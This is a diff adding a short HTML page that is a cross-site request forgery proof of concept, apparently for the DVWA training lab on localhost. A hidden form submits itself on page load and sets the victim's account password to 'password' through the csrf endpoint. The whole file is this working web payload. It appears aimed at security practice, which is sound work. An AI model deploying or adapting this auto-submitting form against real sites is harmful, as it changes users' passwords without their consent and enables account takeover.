@@ -1,0 +1,9 @@
+<html>
+    <body>
+        <form action="http://localhost/DVWA/vulnerabilities/csrf" method="get" id="form">
+            <input type="hidden" value="password" name="password_new">
+            <input type="hidden" value="password" name="password_conf">
+        </form>
+        <script>document.getElementById("form").submit() </script>
+    </body>
+</html>
